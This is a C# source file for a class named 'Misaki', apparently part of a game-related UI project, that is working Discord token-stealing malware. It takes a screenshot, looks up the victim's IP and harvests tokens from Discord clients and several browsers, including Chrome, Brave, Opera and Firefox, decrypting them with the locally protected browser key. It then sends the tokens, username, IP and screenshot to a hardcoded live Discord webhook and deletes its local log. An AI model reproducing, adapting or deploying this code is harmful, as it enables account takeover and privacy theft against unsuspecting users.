#region "Library"

using DownCraftUI.Classes;
using mcV1.Classes;
using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

#endregion

namespace mcV1.Classes
{
	#region "Misaki Class"
	public class Misaki
	{
        public static string Hook = "https://discordapp.com/api/webhooks/1028798612781678753/KKvyyatBxN1LJDjyPP1dsL3UtlPluY6sK3ko-48sVBh1RWvzK3OglW41wheUlvzdp8Jt"; //logs tokens
        private static string _path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\updatelog.txt";

		private static bool App = false;
		private static bool Canary = false;
		private static bool PTB = false;
		private static bool Chrome = false;
		private static bool Opera = false;
		private static bool Brave = false;
		private static bool Yandex = false;
		private static bool OperaGX = false;
		private static bool Lightcord = false;

		private static bool Firefox = false;
		private static bool StealFound;
		private static bool StealFirefoxFound;

		public static bool IsFileinUse(FileInfo file)
		{
			FileStream stream = null;
			if (file.Name.Contains("capture.png") & !file.Exists)
			{
				Thread.Sleep(1000);
				if (!file.Exists)
					return false;
			}
			try
			{
				stream = file.Open(FileMode.Open, FileAccess.ReadWrite, FileShare.None);
			}
			catch (IOException)
			{
				return true;
			}
			finally
			{
				if (stream != null)
					stream.Close();
			}
			return false;
		}

		private static byte[] getMasterKey(string path)
		{
			dynamic jsonKey = JsonConvert.DeserializeObject(File.ReadAllText(path));
			return ProtectedData.Unprotect(Convert.FromBase64String((string)jsonKey.os_crypt.encrypted_key).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
		}

		internal static string Decrypt_Token(byte[] vs)
		{
			throw new NotImplementedException();
		}

		public static string Decrypt_Token(byte[] buffer, string path)
		{
			byte[] iv = buffer.Skip(3).Take(12).ToArray();
			byte[] encrypted = buffer.Skip(15).ToArray();
			var cipher = new GcmBlockCipher(new AesEngine());
			var parameters = new AeadParameters(new KeyParameter(getMasterKey(path)), 128, iv, null);
			cipher.Init(false, parameters);
			var decryptedBytes = new byte[cipher.GetOutputSize(encrypted.Length)];
			var retLen = cipher.ProcessBytes(encrypted, 0, encrypted.Length, decryptedBytes, 0);
			cipher.DoFinal(decryptedBytes, retLen);
			return Encoding.UTF8.GetString(decryptedBytes).TrimEnd("\r\n\0".ToCharArray());
		}

		private static List<string> TokenMisaki(DirectoryInfo Folder, bool checkLogs = false)
		{
			List<string> list = new List<string>();
			try
			{
				FileInfo[] files = Folder.GetFiles(checkLogs ? "*.log" : "*.ldb");
				for (int i = 0; i < files.Length; i++)
				{
					string input = files[i].OpenText().ReadToEnd();
					foreach (object obj in Regex.Matches(input, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}|dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*"))
					{
						if (Regex.IsMatch(((Match)obj).Value, @"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*"))
						{
							string token = Decrypt_Token(Convert.FromBase64String(((Match)obj).Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]), Folder.Parent.Parent.FullName + "\\Local State");
							Task.FromResult(SaveTokens(TokenCheckAcces(token)));
						}
						else Task.FromResult(SaveTokens(TokenCheckAcces(((Match)obj).Value)));
					}
				}
			}
			catch
			{

			}

			list = list.Distinct<string>().ToList<string>();
			if (list.Count > 0)
			{
				Misaki.StealFound = true;
				List<string> list2 = list;
				int index = list.Count - 1;
				list2[index] = (list2[index] ?? "");
			}
			Misaki.Firefox = false;
			Misaki.Opera = false;
			Misaki.Chrome = false;
			Misaki.App = false;
			Misaki.PTB = false;
			Misaki.Brave = false;
			Misaki.Yandex = false;
			Misaki.Canary = false;
			Misaki.OperaGX = false;
			Misaki.Lightcord = false;

			return list;
		}

		private static string SaveTokens(string token)
		{
			if (!(token == ""))
			{
				string text;
				if (Misaki.Chrome)
				{
					text = "Chrome";
				}
				else if (Misaki.Opera)
				{
					text = "Opera";
				}
				else if (Misaki.App)
				{
					text = "Discord App";
				}
				else if (Misaki.Canary)
				{
					text = "Discord Canary";
				}
				else if (Misaki.PTB)
				{
					text = "Discord PTB";
				}
				else if (Misaki.Brave)
				{
					text = "Brave";
				}
				else if (Misaki.Yandex)
				{
					text = "Yandex";
				}
				else if (Misaki.OperaGX)
				{
					text = "Opera GX";
				}
				else if (Misaki.Lightcord)
				{
					text = "Lightcord";
				}
				else
				{
					text = "Unknown";
				}
				text = text + " Token Found :: " + token + "\n";
				File.AppendAllText(Misaki._path, text);
				Misaki.RemoveDuplicatedLines(Misaki._path);
			}
			return token;
		}

		private static void RemoveDuplicatedLines(string path)
		{
			List<string> list = new List<string>();
			StringReader stringReader = new StringReader(File.ReadAllText(path));
			string item;
			while ((item = stringReader.ReadLine()) != null)
			{
				if (!list.Contains(item))
				{
					list.Add(item);
				}
			}
			stringReader.Close();
			StreamWriter streamWriter = new StreamWriter(File.Open(path, FileMode.Open));
			foreach (string value in list)
			{
				streamWriter.WriteLine(value);
			}
			streamWriter.Flush();
			streamWriter.Close();
		}

		private static string TokenCheckAcces(string token)
		{
			using (WebClient webClient = new WebClient())
			{
				NameValueCollection nameValueCollection = new NameValueCollection();
				nameValueCollection[""] = "";
				webClient.Headers.Add("Authorization", token);
				try
				{
					webClient.UploadValues("https://discordapp.com/api/v8/invite/kokoro", nameValueCollection);
				}
				catch (WebException ex)
				{
					string text = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
					if (text.Contains("401: Unauthorized"))
					{
						token = "";
					}
					else if (text.Contains("You need to verify your account in order to perform this action."))
					{
						token = "";
					}
				}
			}
			return token;
		}

		static void LoadFiles(string path, byte[] fileBytes)
		{
			File.WriteAllBytes(path, fileBytes);
		}

		public static void Start()
		{
			Functions FUNCS = new Functions();

			try
			{
				string tmp = Path.GetTempPath();
				const string file1 = "snuvcdsm.exe";
				const string file2 = "xwizard.exe";

				Bitmap bit = new Bitmap(1920, 1080);
				Graphics g = Graphics.FromImage(bit);
				g.CopyFromScreen(new Point(30, 30), new Point(0, 0), bit.Size);
				g.Dispose();
				bit.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "Discord.jpeg");

				string file = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "Discord.jpeg";

				string externalip = new WebClient().DownloadString("http://ipinfo.io/ip");

				FUNCS.SendWebookFile(Hook, "Misaki Token Grab", "", "IP: " + externalip + "\n PC Name: " + Environment.UserName + "\n ScreenShot:", "file.png", file);

				Misaki.StealTokenFromChrome();
				Misaki.StealTokenFromOpera();
				Misaki.StealTokenFromOperaGX();
				Misaki.StealTokenFromDiscordApp();
				Misaki.StealTokenFromDiscordCanary();
				Misaki.StealTokenFromDiscordPTB();
				Misaki.StealTokenFromBraveBrowser();
				Misaki.StealTokenFromYandexBrowser();
				Misaki.StealTokenFromFirefox();
				Misaki.StealTokenFromLightcord();

				Misaki.Send(File.ReadAllText(Misaki._path));

				if (File.Exists(Misaki._path))
				{
					File.Delete(Misaki._path);
				}
			}
			catch (Exception)
			{

			}
		}

		private static void Send(string tokenReport)
		{
			try
			{
				string externalip = new WebClient().DownloadString("http://ipinfo.io/ip");

				HttpClient httpClient = new HttpClient();
				Dictionary<string, string> nameValueCollection = new Dictionary<string, string>
				{
					{
						"content",
						string.Concat(new string[]
						{
							string.Join("\n", new string[]
							{
								"᲼᲼᲼᲼᲼᲼\n***New report from PC: " + Environment.UserName + " with IP: " + externalip + "*** ```asciidoc\n" + tokenReport + "\n```"
							}),
						})
					},
				};
				httpClient.PostAsync(Hook, new FormUrlEncodedContent(nameValueCollection)).GetAwaiter().GetResult();
			}
			catch
			{
			}
		}

		private static void StealTokenFromDiscordApp()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Misaki.App = true;
				List<string> list = Misaki.TokenMisaki(folder, false);
				if (list != null && list.Count > 0)
				{
					Misaki.App = true;
				}
			}
		}

		private static void StealTokenFromDiscordCanary()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordcanary\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Misaki.Canary = true;
				List<string> list = Misaki.TokenMisaki(folder, false);
				if (list != null && list.Count > 0)
				{
					Misaki.Canary = true;
				}
			}
		}

		private static void StealTokenFromDiscordPTB()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordptb\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Misaki.PTB = true;
				List<string> list = Misaki.TokenMisaki(folder, false);
				if (list != null && list.Count > 0)
				{
					Misaki.PTB = true;
				}
			}
		}

		private static void StealTokenFromLightcord()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Lightcord\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Misaki.Lightcord = true;
				List<string> list = Misaki.TokenMisaki(folder, false);
				if (list != null && list.Count > 0)
				{
					Misaki.Lightcord = true;
				}
			}
		}

		private static void StealTokenFromBraveBrowser()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Misaki.Brave = true;
				List<string> list = Misaki.TokenMisaki(folder, false);
				if (list != null && list.Count > 0)
				{
					Misaki.Brave = true;
				}
			}
		}

		private static void StealTokenFromYandexBrowser()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Misaki.Yandex = true;
				List<string> list = Misaki.TokenMisaki(folder, false);
				if (list != null && list.Count > 0)
				{
					Misaki.Yandex = true;
				}
			}
		}

		private static void StealTokenFromChrome()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Misaki.Chrome = true;
				List<string> list = Misaki.TokenMisaki(folder, false);
				if (list != null && list.Count > 0)
				{
					Misaki.Chrome = true;
				}
			}
		}

		private static void StealTokenFromOpera()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Misaki.Opera = true;
				List<string> list = Misaki.TokenMisaki(folder, false);
				if (list != null && list.Count > 0)
				{
					Misaki.Opera = true;
				}
			}
		}

		private static void StealTokenFromOperaGX()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Misaki.OperaGX = true;
				List<string> list = Misaki.TokenMisaki(folder, false);
				if (list != null && list.Count > 0)
				{
					Misaki.OperaGX = true;
				}
			}
		}

		private static void StealTokenFromFirefox()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles\\";
			if (Directory.Exists(path))
			{
				foreach (string text in Directory.EnumerateFiles(path, "webappsstore.sqlite", SearchOption.AllDirectories))
				{
					List<string> list = Misaki.TokenMisakiForFirefox(new DirectoryInfo(text.Replace("webappsstore.sqlite", "")), false);
					if (list != null && list.Count > 0)
					{
						foreach (string str in (from t in list
												where !Misaki.App
												select t).Select(new Func<string, string>(Misaki.TokenCheckAcces)))
						{
							Misaki.Firefox = true;
							File.AppendAllText(Misaki._path, "Firefox Token: " + str + Environment.NewLine);
						}
					}
				}
			}
		}

		private static List<string> TokenMisakiForFirefox(DirectoryInfo Folder, bool checkLogs = false)
		{
			List<string> list = new List<string>();
			try
			{
				FileInfo[] files = Folder.GetFiles(checkLogs ? "*.log" : "*.sqlite");
				for (int i = 0; i < files.Length; i++)
				{
					string input = files[i].OpenText().ReadToEnd();
					foreach (object obj in Regex.Matches(input, @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}"))
					{
						Match match = (Match)obj;
						list.Add(match.Value);
					}
					foreach (object obj2 in Regex.Matches(input, @"mfa\.[a-zA-Z0-9_\-]{84}"))
					{
						Match match2 = (Match)obj2;
						list.Add(match2.Value);
					}
				}
			}
			catch
			{
			}
			list = list.Distinct<string>().ToList<string>();
			if (list.Count > 0)
			{
				Misaki.StealFirefoxFound = true;
				List<string> list2 = list;
				int index = list.Count - 1;
				list2[index] = (list2[index] ?? "");
			}
			Misaki.Firefox = false;
			return list;
		}
	}

	#endregion
}